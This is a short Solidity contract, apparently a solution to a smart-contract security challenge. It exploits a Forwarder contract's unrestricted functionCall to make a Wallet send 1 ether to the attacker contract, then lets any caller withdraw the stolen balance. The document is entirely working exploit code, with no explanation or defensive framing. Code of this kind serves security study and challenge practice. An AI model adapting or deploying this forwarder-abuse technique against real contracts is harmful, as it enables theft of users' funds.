// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

import "../Forwarder.sol";

contract WalletExploit {
    Forwarder public forwarder;
    Wallet public wallet;
    
    constructor(address _forwarder, address _wallet) {
        forwarder = Forwarder(_forwarder);
        wallet = Wallet(_wallet);
    }
    
    function exploit() external {
        // Encode the sendEther function call
        bytes memory payload = abi.encodeWithSignature(
            "sendEther(address,uint256)",
            address(this),   
            1 ether         
        );
        
         
        forwarder.functionCall(address(wallet), payload);
    }
    
    receive() external payable {}
    
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}